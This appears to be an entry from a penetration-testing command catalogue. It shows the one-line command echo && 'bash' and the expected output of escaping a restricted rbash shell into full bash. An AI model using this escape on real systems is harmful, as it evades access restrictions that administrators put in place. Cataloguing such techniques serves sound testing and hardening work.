---
id: d7bc0e50-bdb5-4a6d-a2ac-93f37ea658ef
name: echo Bypass restricted shell
type: command
executor: ''
data: echo && 'bash'
output: 'method@hacker:~$ echo $0

  rbash

  method@hacker:~$ echo && ''bash''

  method@hacker:~$ echo $0

  bash'
created_at: '2019-09-19T17:03:16.203587+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# echo Bypass restricted shell

```bash
echo && 'bash'
```

## Expected Output

```
method@hacker:~$ echo $0
rbash
method@hacker:~$ echo && 'bash'
method@hacker:~$ echo $0
bash
```


